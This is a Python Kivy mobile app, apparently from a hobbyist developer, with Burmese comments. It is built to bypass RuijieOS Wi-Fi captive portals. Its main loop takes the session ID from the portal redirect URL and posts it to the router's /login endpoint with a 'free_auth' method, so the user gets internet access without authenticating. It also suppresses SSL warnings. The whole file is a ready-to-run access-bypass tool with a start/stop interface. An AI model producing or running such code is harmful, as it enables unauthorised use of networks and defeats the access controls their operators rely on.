import threading
import requests
import re
import urllib3
import time
from urllib.parse import urlparse, parse_qs
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.clock import Clock
from kivy.graphics import Color, Rectangle

# SSL Warning များကို ပိတ်ထားခြင်း (Local Router များအတွက် လိုအပ်သည်)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class TurboApp(App):
    def build(self):
        self.root = BoxLayout(orientation='vertical', padding=20, spacing=15)
        
        with self.root.canvas.before:
            Color(0.05, 0.05, 0.05, 1) 
            self.rect = Rectangle(size=(2000, 2000), pos=self.root.pos)

        # UI Elements
        self.title_label = Label(text="[b]Ruijie Router Turbo[/b]", markup=True, font_size='22sp', color=(0, 1, 1, 1))
        self.status_label = Label(text="Status: [color=00FF00]Ready[/color]", markup=True, font_size='18sp')
        self.info_label = Label(text="Target: RuijieOS Captive Portal", font_size='14sp', color=(0.8, 0.8, 0.8, 1))

        self.start_btn = Button(text="START TURBO", size_hint=(1, 0.2), background_color=(0, 0.7, 0, 1), font_size='18sp')
        self.start_btn.bind(on_press=self.start_process_thread)

        self.stop_btn = Button(text="STOP", size_hint=(1, 0.2), background_color=(0.7, 0, 0, 1), font_size='18sp')
        self.stop_btn.bind(on_press=self.stop_process)
        
        self.root.add_widget(self.title_label)
        self.root.add_widget(self.status_label)
        self.root.add_widget(self.info_label)
        self.root.add_widget(self.start_btn)
        
        self.dev_label = Label(text="Developed by htlwin", font_size='10sp', color=(0.4, 0.4, 0.4, 1))
        self.root.add_widget(self.dev_label)

        self.running = False
        return self.root

    def update_status(self, text):
        self.status_label.text = f"Status: {text}"

    def start_process_thread(self, instance):
        if not self.running:
            self.running = True
            self.update_status("[color=FFFF00]Scanning Portal...[/color]")
            self.root.remove_widget(self.start_btn)
            self.root.add_widget(self.stop_btn, index=3)
            threading.Thread(target=self.main_logic, daemon=True).start()

    def stop_process(self, instance):
        self.running = False
        self.update_status("[color=00FF00]Stopped[/color]")
        self.root.remove_widget(self.stop_btn)
        self.root.add_widget(self.start_btn, index=3)

    def main_logic(self):
        session = requests.Session()
        # RuijieOS Browser User-Agent အတုယူခြင်း
        session.headers.update({'User-Agent': 'Mozilla/5.0 (Android 11; Mobile; rv:94.0) Gecko/94.0 Firefox/94.0'})

        while self.running:
            try:
                # 1. Connectivity Check (Captive Portal ရှိမရှိ စစ်ဆေးခြင်း)
                r = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, verify=False)
                
                if r.status_code == 204:
                    Clock.schedule_once(lambda dt: self.update_status("[color=00FF00]Internet OK[/color]"), 0)
                    time.sleep(10)
                    continue

                # 2. Redirect URL ထဲမှ SID ကို ဆွဲထုတ်ခြင်း
                portal_url = r.url
                parsed_url = urlparse(portal_url)
                params = parse_qs(parsed_url.query)
                sid = params.get('sid', [None])[0]

                if sid:
                    Clock.schedule_once(lambda dt: self.update_status(f"[color=00FFFF]Bypassing: {sid[:8]}...[/color]"), 0)
                    # RuijieOS Bypass API (ဥပမာ logic သာဖြစ်သည်၊ router ပေါ်မူတည်၍ ပြောင်းလဲနိုင်သည်)
                    bypass_url = f"http://{parsed_url.netloc}/login"
                    session.post(bypass_url, data={'sid': sid, 'method': 'free_auth'}, timeout=5)
                else:
                    Clock.schedule_once(lambda dt: self.update_status("[color=FF0000]Portal Found (No SID)[/color]"), 0)

            except Exception as e:
                Clock.schedule_once(lambda dt: self.update_status("[color=FF8800]Waiting for WiFi...[/color]"), 0)
            
            time.sleep(5)

if __name__ == '__main__':
    TurboApp().run()
    
